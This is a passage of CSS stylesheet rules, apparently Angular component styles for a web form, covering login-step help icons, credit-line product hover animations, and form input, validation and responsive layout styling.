            background: 0 0;
            -webkit-animation: .1s belek-animatedStepLogin-reverse;
            animation: .1s belek-animatedStepLogin-reverse
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c28]:hover i.stream-help-circle[_ngcontent-c28] {
            cursor: pointer
        }

        .tokyo_icon.helpLoginStepPasswordMode[_ngcontent-c28]:hover i.stream-help-circle[_ngcontent-c28]+.belek-background[_ngcontent-c28] {
            height: 21px;
            width: 21px;
            background: rgba(0, 0, 0, .05);
            top: 7px;
            left: 0;
            -webkit-animation: .1s belek-animatedStepLogin;
            animation: .1s belek-animatedStepLogin
        }

        .tokyo_icon.error[_ngcontent-c28] i[_ngcontent-c28] {
            color: #ec2e33
        }

        .tokyo_icon.error[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            display: none
        }

        .tokyo_icon.warning[_ngcontent-c28] i[_ngcontent-c28] {
            color: #f57c00
        }

        .tokyo_icon.warning[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            display: none
        }

        .tokyo_icon.success[_ngcontent-c28] i[_ngcontent-c28] {
            color: #00a756
        }

        .tokyo_icon.success[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            display: none
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c28] .belek-background[_ngcontent-c28] {
            top: 16px;
            left: 8px;
            -webkit-animation: .1s belek-animated-CreditLineMode-reverse;
            animation: .1s belek-animated-CreditLineMode-reverse
        }

        .tokyo_icon.creditLineProductMode[_ngcontent-c28]:hover .belek-background[_ngcontent-c28] {
            top: 10px;
            left: -2px;
            -webkit-animation: .1s belek-animated-CreditLineMode;
            animation: .1s belek-animated-CreditLineMode
        }

        .tokyo_content.dark[_ngcontent-c28] .tokyo_item[_ngcontent-c28] .tokyo_item_value[_ngcontent-c28] {
            white-space: normal;
            vertical-align: top
        }

        @-webkit-keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @keyframes belek-animated-CreditLineMode {
            0% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }

            100% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }
        }

        @-webkit-keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }

        @keyframes belek-animated-CreditLineMode-reverse {
            0% {
                width: 26px;
                top: 10px;
                left: -2px;
                height: 20px;
                background: rgba(0, 0, 0, .05)
            }

            100% {
                width: 7px;
                top: 16px;
                left: 8px;
                height: 8px;
                background: 0 0
            }
        }
    </style>
<style>
        @charset "UTF-8";

        .venecia-form[_ngcontent-c20] {
            padding: 0 30px 20px
        }

        .venecia-main-form[_ngcontent-c20] {
            padding: 10px 0
        }

        .venecia-main-form-label-parent[_ngcontent-c20] {
            display: inline-block
        }

        .venecia-main-form-label[_ngcontent-c20] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            padding-top: 5px;
            padding-bottom: 6px
        }

        .venecia-main-form-content[_ngcontent-c20] {
            display: inline-block
        }

        .venecia-main-form-label-readonly[_ngcontent-c20] {
            display: inline-block;
            font-size: 12px;
            color: #666;
            width: 146px;
            word-wrap: break-word;
            vertical-align: middle
        }

        .venecia-main-form-label-readonly[_ngcontent-c20]:after {
            content: ":"
        }

        .venecia-main-form-label-data[_ngcontent-c20] {
            display: inline-block;
            font-size: 14px;
            color: #333;
            overflow: hidden;
            text-overflow: ellipsis;
            white-space: nowrap;
            vertical-align: middle;
            padding-top: 0
        }

        .venecia-main-form-input[_ngcontent-c20] {
            border: 1px solid #bbb;
            width: 215px;
            height: 30px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 3px
        }

        .venecia-main-form-input.disabled[_ngcontent-c20] {
            border: 1px solid rgba(187, 187, 187, .4);
            background: #fff
        }

        .venecia-main-form-input.x-small[_ngcontent-c20] {
            width: 70px
        }

        .venecia-main-form-input.required[_ngcontent-c20],
        .venecia-main-form-input.required[_ngcontent-c20]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-input.required.valid[_ngcontent-c20],
        .venecia-main-form-input.required[_ngcontent-c20]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-input.required.disabled[_ngcontent-c20],
        .venecia-main-form-input.required[_ngcontent-c20]:focus.disabled {
            border-left: 3px solid rgba(0, 167, 86, .4) !important;
            background: #fff
        }

        .venecia-main-form-input[_ngcontent-c20]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-input[_ngcontent-c20]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c20]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c20]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[_ngcontent-c20]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-input[type=email][_ngcontent-c20],
        .venecia-main-form-input[type=number][_ngcontent-c20],
        .venecia-main-form-input[type=tel][_ngcontent-c20],
        .venecia-main-form-input[type=text][_ngcontent-c20] {
            padding: 0 8px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c20] {
            padding: 0 10px 0 6px
        }

        .venecia-main-form-input[type=date][_ngcontent-c20]::-webkit-inner-spin-button {
            display: none
        }

        .venecia-main-form-input[type=date][_ngcontent-c20]::-webkit-calendar-picker-indicator {
            display: none
        }

        .venecia-main-form-input.required[_ngcontent-c20]:-moz-read-only,
        .venecia-main-form-input[_ngcontent-c20]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-input.required[_ngcontent-c20]:read-only,
        .venecia-main-form-input[_ngcontent-c20]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea[_ngcontent-c20] {
            border: 1px solid #bbb;
            width: 215px;
            padding: 0 8px 0 6px;
            font-size: 14px;
            color: #333;
            margin-bottom: 2px;
            resize: none
        }

        .venecia-main-form-textarea.required[_ngcontent-c20],
        .venecia-main-form-textarea.required[_ngcontent-c20]:focus {
            border-left: 3px solid #0097c1
        }

        .venecia-main-form-textarea.required.valid[_ngcontent-c20],
        .venecia-main-form-textarea.required[_ngcontent-c20]:focus.valid {
            border-left: 3px solid #00a756 !important
        }

        .venecia-main-form-textarea[_ngcontent-c20]:focus {
            border: 1px solid #999;
            outline: 0;
            -webkit-box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1);
            box-shadow: 0 0 4px 1px rgba(0, 0, 0, .1)
        }

        .venecia-main-form-textarea[_ngcontent-c20]:focus::-webkit-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c20]:focus:-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c20]:focus::-ms-input-placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea[_ngcontent-c20]:focus::placeholder {
            color: #f2f6f6
        }

        .venecia-main-form-textarea.required[_ngcontent-c20]:-moz-read-only,
        .venecia-main-form-textarea[_ngcontent-c20]:-moz-read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        .venecia-main-form-textarea.required[_ngcontent-c20]:read-only,
        .venecia-main-form-textarea[_ngcontent-c20]:read-only {
            border: 1px solid transparent !important;
            color: #333;
            margin-bottom: 0;
            height: 18px
        }

        @-webkit-keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        @keyframes venecia-input-readonly {

            0%,
            100% {
                border: 1px solid transparent !important
            }
        }

        .venecia-main-form-input[_ngcontent-c20]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c20]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c20]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[_ngcontent-c20]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c20]::-webkit-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c20]:-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c20]::-moz-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-textarea[_ngcontent-c20]:-ms-input-placeholder {
            color: #d1d1d1 !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c20]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c20]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c20]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input[placeholder][_ngcontent-c20]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c20]:focus::-webkit-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c20]:focus:-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c20]:focus::-moz-placeholder {
            color: transparent !important
        }

        .venecia-main-form-textarea[placeholder][_ngcontent-c20]:focus:-ms-input-placeholder {
            color: transparent !important
        }

        .venecia-main-form-input.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-form-input.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-form-input.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-form-input.large[_ngcontent-c20] {
            width: 350px
        }

        .venecia-main-form-textarea.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-form-textarea.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-form-textarea.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-form-textarea.large[_ngcontent-c20] {
            width: 350px
        }

        .venecia-main-form-title[_ngcontent-c20] {
            font-size: 16px;
            margin: 0;
            padding: 0;
            color: #12447f
        }

        .venecia-main-form-line-separator[_ngcontent-c20] {
            height: 1px;
            width: 100%;
            background: #e1e1e1;
            margin: 2px 0
        }

        .venecia-main-form-required[_ngcontent-c20] {
            height: 10px;
            border-left: 3px solid #0097c1;
            line-height: .4;
            padding-left: 8px;
            margin-top: -10px
        }

        .venecia-main-form-required[_ngcontent-c20]:before {
            clear: both
        }

        .venecia-main-form-required-text[_ngcontent-c20] {
            line-height: 0;
            font-size: 11px
        }

        .venecia-main-form-required.no-show[_ngcontent-c20] {
            display: none
        }

        .venecia-main-validation[_ngcontent-c20] {
            color: #b20000;
            font-size: 12px;
            padding-left: 149px;
            padding-top: 5px;
            opacity: 0
        }

        .venecia-main-form.invalid[_ngcontent-c20] .venecia-main-validation[_ngcontent-c20] {
            display: block;
            opacity: 1;
            -webkit-animation: .3s venecia-validation-message-animated;
            animation: .3s venecia-validation-message-animated
        }

        .confirmationMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
            width: 30px
        }

        @-webkit-keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        @keyframes venecia-validation-message-animated {
            0% {
                opacity: 0
            }

            100% {
                opacity: 1
            }
        }

        .venecia-main-form[_ngcontent-c20] .venecia-main-validation[_ngcontent-c20] {
            display: none;
            opacity: 0;
            -webkit-animation: .3s venecia-validation-message-reverse;
            animation: .3s venecia-validation-message-reverse
        }

        @-webkit-keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        @keyframes venecia-validation-message-reverse {
            0% {
                opacity: 1;
                display: block
            }

            99% {
                opacity: 0;
                display: block
            }

            100% {
                display: none
            }
        }

        .venecia-main-form.invalid[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20] {
            border: 1px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-animated;
            animation: .3s venecia-validation-input-animated
        }

        .venecia-main-form[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20] {
            border: 1px solid #bbb;
            -webkit-animation: .3s venecia-validation-input-reverse;
            animation: .3s venecia-validation-input-reverse
        }

        .venecia-main-form-input[_ngcontent-c20],
        .venecia-main-form-input[_ngcontent-c20]:focus,
        .venecia-main-form-textarea[_ngcontent-c20],
        .venecia-main-form-textarea[_ngcontent-c20]:focus {
            border-left: 3px solid #bbb;
            background: #fff
        }

        .venecia-main-form.invalid[_ngcontent-c20] .venecia-main-form-input.required[_ngcontent-c20] {
            border: 1px solid #b20000;
            border-left: 3px solid #b20000;
            -webkit-animation: .3s venecia-validation-input-required-animated;
            animation: .3s venecia-validation-input-required-animated
        }

        .venecia-main-form[_ngcontent-c20] .venecia-main-form-input.required[_ngcontent-c20] {
            border: 1px solid #bbb;
            border-left: 3px solid #0097c1;
            -webkit-animation: .3s venecia-validation-input-required-reverse;
            animation: .3s venecia-validation-input-required-reverse
        }

        @-webkit-keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @keyframes venecia-validation-input-required-animated {
            0% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }

            100% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @keyframes venecia-validation-input-required-reverse {
            0% {
                border: 1px solid #b20000;
                border-left: 3px solid #b20000
            }

            100% {
                border: 1px solid #bbb;
                border-left: 3px solid #0097c1
            }
        }

        @-webkit-keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @keyframes venecia-validation-input-animated {
            0% {
                border: 1px solid #bbb
            }

            100% {
                border: 1px solid #b20000
            }
        }

        @-webkit-keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        @keyframes venecia-validation-input-reverse {
            0% {
                border: 1px solid #b20000
            }

            100% {
                border: 1px solid #bbb
            }
        }

        .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error[_ngcontent-c20] {
            width: 215px
        }

        .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.large[_ngcontent-c20] {
            width: 350px
        }

        .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error[_ngcontent-c20] {
            width: 170px
        }

        .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.large[_ngcontent-c20] {
            width: 350px
        }

        @media only screen and (max-width:767px) and (min-width:640px) {
            .venecia-main-form-input[_ngcontent-c20] {
                font-size: 13px
            }
        }

        @media only screen and (max-width:639px) and (min-width:320px) {

            .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error[_ngcontent-c20],
            .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.large[_ngcontent-c20],
            .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.medium[_ngcontent-c20],
            .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.small[_ngcontent-c20],
            .venecia-main-form-input[_ngcontent-c20]+.venecia-main-box-error.xsmall[_ngcontent-c20],
            .venecia-main-form-select[_ngcontent-c20]+.venecia-main-box-error[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.large[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.medium[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.small[_ngcontent-c20],
            .venecia-main-form-textarea[_ngcontent-c20]+.venecia-main-box-error.xsmall[_ngcontent-c20] {
                width: 100%
            }

            .venecia-main-form-input[_ngcontent-c20] {
                font-size: 13px;
                display: block
            }

            .venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
                display: block
            }

            .venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20] {
                width: 100%
            }

            .venecia-main-box[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.disabled[_ngcontent-c20] {
                background-color: #a4a4a4;
                opacity: .4;
                border-left: none !important
            }

            .venecia-main-box[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
                margin-left: 3px
            }

            .venecia-main-form[_ngcontent-c20] {
                padding: 8px 0 0
            }

            .venecia-form[_ngcontent-c20] {
                padding: 0 15px 20px
            }

            .venecia-main-form-label[_ngcontent-c20] {
                width: 100%
            }

            .venecia-main-form-label-data[_ngcontent-c20] {
                display: block
            }

            .venecia-main-form-input.large[_ngcontent-c20],
            .venecia-main-form-input.medium[_ngcontent-c20],
            .venecia-main-form-input.small[_ngcontent-c20],
            .venecia-main-form-input.xsmall[_ngcontent-c20],
            .venecia-main-form-textarea.large[_ngcontent-c20],
            .venecia-main-form-textarea.medium[_ngcontent-c20],
            .venecia-main-form-textarea.small[_ngcontent-c20],
            .venecia-main-form-textarea.xsmall[_ngcontent-c20] {
                width: 100%
            }
        }

        @media only screen and (min-width:640px) {
            .venecia-main-form-label-data[_ngcontent-c20] {
                line-height: 30px;
                min-height: 30px
            }

            .venecia-main-form-label-parent[_ngcontent-c20] {
                display: inline-block;
                vertical-align: top;
                min-height: 30px;
                padding-top: 2px
            }
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] {
            display: block;
            width: auto;
            height: auto;
            margin: 0 !important;
            padding: 0 0 4px !important;
            min-height: 0 !important;
            line-height: normal;
            white-space: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label[_ngcontent-c20] {
            display: inline-block;
            width: 146px;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 12px;
            color: #666
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-data[_ngcontent-c20] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 5px 0 6px;
            max-width: calc(100% - 150px);
            min-height: 0;
            overflow: visible;
            text-overflow: clip;
            vertical-align: top;
            line-height: normal;
            white-space: normal;
            word-wrap: break-word;
            font-size: 14px;
            color: #333
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-label-parent[_ngcontent-c20] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 0;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] {
            display: inline-block;
            width: auto;
            height: auto;
            margin: 0;
            padding: 0 0 3px;
            min-height: 0;
            vertical-align: top;
            line-height: normal
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea[_ngcontent-c20] {
            display: inline-block;
            width: 215px;
            margin: 0
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.xxxsmall[_ngcontent-c20] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.xxsmall[_ngcontent-c20] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-input.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-select.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-form-textarea.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-input.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-select.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-form-textarea.large[_ngcontent-c20] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error[_ngcontent-c20] {
            width: 215px;
            margin: 4px 0;
            padding: 0;
            line-height: 11px;
            font-size: 12px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.xxxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.xxxsmall[_ngcontent-c20] {
            width: 42px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.xxsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.xxsmall[_ngcontent-c20] {
            width: 100px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.xsmall[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.xsmall[_ngcontent-c20] {
            width: 128px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.small[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.small[_ngcontent-c20] {
            width: 168px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.medium[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.medium[_ngcontent-c20] {
            width: 296px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-content[_ngcontent-c20] .venecia-main-box-error.large[_ngcontent-c20],
        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20] .venecia-main-box-error.large[_ngcontent-c20] {
            width: 350px
        }

        .venecia-main-box.formLayoutMode[_ngcontent-c20] .venecia-main-form-drop[_ngcontent-c20]:after {
            top: 10px
        }

        .venecia-main-box.cardLayoutMode[_ngcontent-c20] {
            padding: 0 0 6px !important
        }

